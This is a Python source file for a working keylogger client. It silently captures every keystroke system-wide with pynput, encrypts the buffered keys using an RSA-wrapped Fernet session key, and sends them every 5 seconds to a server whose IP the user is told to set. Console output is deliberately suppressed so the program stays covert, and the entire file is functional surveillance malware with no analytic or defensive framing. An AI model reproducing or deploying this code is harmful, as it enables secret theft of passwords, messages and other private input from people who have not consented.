"""
client.py (auto-send mode with keylogger)
-----------------------------------------
- Receives RSA public key from server.
- Generates a Fernet session key, sends it encrypted to server.
- Uses pynput to capture keystrokes system-wide silently.
- Buffers keystrokes (characters and special keys).
- Every 5 seconds, encrypts the buffered keystrokes as a string and sends to server.
- Runs in the background; no console interaction or echoing.
- Special keys are logged as [Key.name] (e.g., [Key.space], [Key.enter]).
- Note: Change HOST to the IP address of your other machine on the same network.
"""

import socket
import threading
import time
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet
from pynput import keyboard
import sys

# -----------------------------
# 1) Connect to server
# -----------------------------
HOST = "127.0.0.1"  # Change this to the IP of your other machine, e.g., "192.168.1.100"
PORT = 5000
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

# -----------------------------
# 2) Receive RSA public key from server
# -----------------------------
rsa_public_pem = client.recv(4096)
rsa_public_key = serialization.load_pem_public_key(rsa_public_pem)
# print("[*] Received RSA public key.")

# -----------------------------
# 3) Generate Fernet session key and send encrypted
# -----------------------------
session_key = Fernet.generate_key()
fernet = Fernet(session_key)

encrypted_session_key = rsa_public_key.encrypt(
    session_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)
client.sendall(encrypted_session_key)
# print("[*] Fernet session key sent to server.")

# -----------------------------
# 4) Shared buffer for keystrokes
# -----------------------------
buffer = []
buffer_lock = threading.Lock()


def on_press(key):
    """
    Captures keystrokes silently and appends to the shared buffer.
    - Printable chars: appended directly.
    - Special keys: appended as [Key.name] (e.g., [Key.space]).
    - No echoing or console interference.
    """
    with buffer_lock:
        if hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        else:
            buffer.append(f"[{str(key)}]")


# No on_release needed, as we don't stop on specific keys (run persistently)


def send_loop():
    """
    Every 5 seconds, take whatever is in buffer,
    encrypt it as a joined string, send to server, then clear buffer.
    """
    while True:
        time.sleep(5)
        with buffer_lock:
            if buffer:
                msg = "".join(buffer).strip()
                buffer.clear()
            else:
                msg = ""

        if msg:
            encrypted = fernet.encrypt(msg.encode())
            client.sendall(encrypted)
            # print("\n[Sent]\n")  # Commented for silent execution


# -----------------------------
# 5) Start keystroke listener and send thread
# -----------------------------
# Start pynput listener in a daemon thread to capture keystrokes silently
def start_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.wait()  # Wait forever (daemon will keep it running)


threading.Thread(target=start_listener, daemon=True).start()
threading.Thread(target=send_loop, daemon=True).start()

try:
    while True:
        time.sleep(1)  # Keep main thread alive
except KeyboardInterrupt:
    # print("\n[*] Closing client.")  # Commented for silent execution
    sys.exit(0)
finally:
    client.close()
